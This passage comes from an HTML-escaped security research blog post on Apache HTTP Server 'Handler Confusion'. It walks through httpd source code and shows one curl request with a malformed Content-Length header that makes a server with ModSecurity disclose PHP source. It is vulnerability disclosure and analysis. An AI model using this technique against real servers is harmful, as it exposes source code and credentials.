                &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apr_pmemdup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

                &lt;span class=&quot;cm&quot;&gt;/* exclude media type arguments */&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                    &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* strip trailing spaces */&lt;/span&gt;

                &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AP_DEFAULT_HANDLER_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_run_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that before entering the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_run_handler()&lt;/code&gt;, if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; is empty, the content of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; is used as the final module handler. This is also why &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddHandler&lt;/code&gt; have the identical effect, because the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;media-type&lt;/code&gt; is eventually converted into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handler-name&lt;/code&gt; before handling. So, our third Handler Confusion is mainly developed around this behavior.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-primitive-3-1-overwrite-the-handler&quot;&gt;âš”ï¸ Primitive 3-1. Overwrite the Handler&lt;/h4&gt;

&lt;p&gt;By understanding this conversion mechanism, the first primitive is â€” &lt;strong&gt;Overwrite the Handler&lt;/strong&gt;. Imagine if today the target Apache HTTP Server uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; to run PHP.&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddType&lt;/span&gt; application/x-httpd-php  .php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the normal process, when accessing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://server/config.php&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_mime&lt;/code&gt;, during the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type_checker&lt;/code&gt; phase, Httpd copies the corresponding content into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; based on the file extension set by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt;. Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; is not assigned during the entire HTTP lifecycle, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt; will treat &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; as the handler, ultimately calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; to handle the request.&lt;/p&gt;

&lt;p&gt;However, what happens if any module â€œaccidentallyâ€ overwrites &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; before reaching &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt;?&lt;/p&gt;

&lt;h5 id=&quot;ï¸-3-1-1-overwrite-handler-to-disclose-php-source-code&quot;&gt;âœ”ï¸ 3-1-1. Overwrite Handler to Disclose PHP Source Code&lt;/h5&gt;

&lt;p&gt;The first exploitation of this primitive is to disclose arbitrary PHP source code by the â€œaccidentally-overwriteâ€. This technique was first mentioned by Max Dmitriev in his research presented at ZeroNights 2021 (kudos to him!), and you can check his slides here:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf&quot;&gt;Apache 0day bug, which still nobody knows of, and which was fixed accidentally&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Max Dmitriev observed that by sending an incorrect &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Length&lt;/code&gt;, the remote Httpd server would trigger an unexpected error and inadvertently return the source code of PHP script. Upon investigating the process, he discovered that the issue was due to ModSecurity not properly handling the return value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AP_FILTER_ERROR&lt;/code&gt; while using the Apache Portable Runtime (APR) library, leading to a &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;double response&lt;/a&gt;. When an error occurred, Httpd attempts to send out HTML error messages, thus accidentally overwriting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;text/html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Because ModSecurity did not properly handle the return values, the internal HTTP lifecycle that should have stopped continued. This â€œside effectâ€ also overwrote the originally added &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;, resulting in files that should have been processed as PHP being treated as plain documents, exposing its source code and sensitive settings. ğŸ¤«&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; http://127.0.0.1/info.php &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Length: x&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; HTTP/1.1 400 Bad Request
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Date: Mon, 29 Jul 2024 05:32:23 GMT
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Server: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1

&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE HTML PUBLIC &lt;span class=&quot;s2&quot;&gt;&quot;-//IETF//DTD HTML 2.0//EN&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;html&amp;gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;title&amp;gt;400 Bad Request&amp;lt;/title&amp;gt;
...
&amp;lt;?php phpinfo&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In theory, all configurations based on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; are vulnerable to this type of attack, so apart from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi&lt;/code&gt; paired with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_actions&lt;/code&gt; shown in  Maxâ€™s slides, pure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; coupled with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; is also affected.&lt;/p&gt;

&lt;p&gt;Itâ€™s worth mentioning that this side effect was corrected as a &lt;a href=&quot;https://github.com/apache/httpd/commit/3303dc4f7273e05ea9a80402b33f68cd155c146a&quot;&gt;request parser bug&lt;/a&gt; in Apache HTTP Server version 2.4.44, thus treating this â€œvulnerabilityâ€ as fixed until I picked it up again. However, since the root cause is still ModSecurity not handling errors properly, the same behavior can still be successfully reproduced if another code path that triggers &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AP_FILTER_ERROR&lt;/code&gt; is found.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. This issue was reported to ModSecurity through the official security mail on 6/20, and the Project Co-Leader suggested returning to the original &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;GitHub Issue&lt;/a&gt; for discussion.&lt;/em&gt;&lt;/p&gt;

&lt;h5 id=&quot;ï¸-3-1-2-overwrite-handler-to---&quot;&gt;âœ”ï¸ 3-1-2. Overwrite Handler to â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ&lt;/h5&gt;

&lt;p&gt;Based on the &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;double response&lt;/a&gt; behavior and its side effects mentioned earlier, this primitive could lead to other more cool exploitations. However, as this issue has not been fully fixed, further exploitation will be disclosed after the issue is fully resolved.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-primitive-3-2-invoke-arbitrary-handlers&quot;&gt;âš”ï¸ Primitive 3-2. Invoke Arbitrary Handlers&lt;/h4&gt;

&lt;p&gt;Letâ€™s think more carefully about the previous Overwrite Handler primitive, although itâ€™s caused by ModSecurity not properly handling errors, leading to the request being set with the wrong &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;, the deeper fundamental root cause should be â€” &lt;strong&gt;when using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt;, Apache HTTP Server actually cannot distinguish its semantics; this field can be set by directive during the request phase or used as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; header in the server response&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Theoretically, if you can control the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; header in the server response, you could invoke arbitrary module handlers through this legacy code snippet. This is the last primitive of Handler Confusion â€” &lt;strong&gt;invoking any internal module handler&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;However, thereâ€™s still one last piece of the puzzle. In Httpd, all modifications to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; from the server response occur after that legacy code. So, even if you can control the value of that field, at that point in the HTTP lifecycle, itâ€™s too late to do further exploitationâ€¦ is that right?&lt;/p&gt;

&lt;p&gt;We turned to &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3875&quot;&gt;RFC 3875&lt;/a&gt; for a rescue! RFC 3875 is a specification about CGI, and &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2&quot;&gt;Section 6.2.2&lt;/a&gt; defines a Local Redirect Response behavior:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The CGI script can return a URI path and query-string (â€˜local-pathqueryâ€™) for a local resource in a Location header field. This indicates to the server that it should reprocess the request using the path specified.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Simply put, the specification mandates that under certain conditions, CGI must use Server-Side resources to handle redirects. A close examination of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; implementation of this specification reveals:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/generators/mod_cgi.c#L983&quot;&gt;modules/generators/mod_cgi.c#L983&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_scan_script_header_err_brigade_ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1]&lt;/span&gt;
                                                    &lt;span class=&quot;n&quot;&gt;APLOG_MODULE_INDEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log_script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;script_err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HTTP_NOT_MODIFIED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apr_table_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers_out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Location&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2]&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* This redirect needs to be a GET no matter what the original
         * method was.
         */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method_number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;cm&quot;&gt;/* We already read the message body (if any), so don&apos;t allow
         * the redirected request to think it has one.  We can ignore
         * Transfer-Encoding, since we used REQUEST_CHUNKED_ERROR.
         */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;apr_table_unset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers_in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Content-Length&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;ap_internal_redirect_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                     &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [3]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Initially, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; executes&lt;sup&gt;[1]&lt;/sup&gt; CGI and scans its output to set the corresponding headers such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Status&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;. If&lt;sup&gt;[2]&lt;/sup&gt; the returned &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Status&lt;/code&gt; is 200 and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Location&lt;/code&gt; header starts with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;, the response is treated as a Server-Side Redirection and should be processed&lt;sup&gt;[3]&lt;/sup&gt; internally. A closer look at the implementation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_internal_redirect_handler()&lt;/code&gt; shows:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/http/http_request.c#L800&quot;&gt;modules/http/http_request.c#L800&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AP_DECLARE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_internal_redirect_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
